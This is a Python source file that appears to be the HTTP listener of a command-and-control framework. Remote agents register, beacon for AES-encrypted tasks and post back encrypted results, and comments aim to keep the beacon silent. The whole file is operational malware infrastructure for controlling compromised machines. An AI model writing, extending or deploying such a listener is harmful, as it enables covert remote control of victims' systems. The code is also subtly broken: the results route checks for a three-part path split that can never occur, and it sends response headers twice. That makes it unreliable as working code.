#!/usr/bin/env python3 
from controllers.db import *
from http.server import BaseHTTPRequestHandler
import os
from controllers.AES import *

''' 
TO DO: 
1- Response handling should not return a callback/error message but should act silent instead
2- Implement end-to-end encryption
3- Implementing the encryption inside 
'''

class Listener(BaseHTTPRequestHandler):
    def do_GET(self):
        #For testing
        if self.path == '/': 
            self.send_response(200)
            self.end_headers()
            self.wfile.write(bytes('Listener Alive!', 'utf-8'))

        elif self.path.startswith('/reg/') == True and len(os.path.split(self.path)) == 2:
            try:
                agentID = os.path.split(self.path)[1]
                agentIP = self.client_address[0]
                registerAgent(agentID, agentIP) 
                self.send_response(200)
                self.end_headers()
                f = "Agent Registered"
                self.wfile.write(bytes(f, 'utf-8'))
            except:
                f = "Some unexpected error occured"
                self.send_error(500,f)

        elif self.path.startswith('/task/') == True and len(os.path.split(self.path)) == 2:
            try: 
                agentID = os.path.split(self.path)[1]
                task = checkTask(agentID)
                listenerID = getAgentListener(agentID) 
                self.send_response(200) 
                self.end_headers() 
                if(task): 
                    #---------------------------------------------------------
                    cipher = encrypt(listenerID,task)
                    self.wfile.write(bytes(cipher, 'utf-8'))
                    #---------------------------------------------------------
                else: 
                    #No task available, shush the beacon
                    pass    
            except: 
                f = "Some unexpected error occured"
                self.send_error(500,f)
       
    def do_POST(self): 
        if self.path.startswith('/task/results/') == True and len(os.path.split(self.path)) == 3:
            try: 
                agentID = os.path.split(self.path)[2]
                self._set_headers()
                content_len = int(self.headers.get('content-length'))
                #---------------------------------------------------------
                cipher = self.rfile.read(content_len)
                listenerID = getAgentListener(agentID)
                result = decrypt(listenerID, cipher)
                #---------------------------------------------------------
                print('Received Task Results from agent #%s \n Result: %s' %(agentID, result))
                writeResult(agentID, result)
                self.send_response(200)
            except: 
                f = "Some unexpected error occured"
                self.send_error(500,f)
    def _set_headers(self): 
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()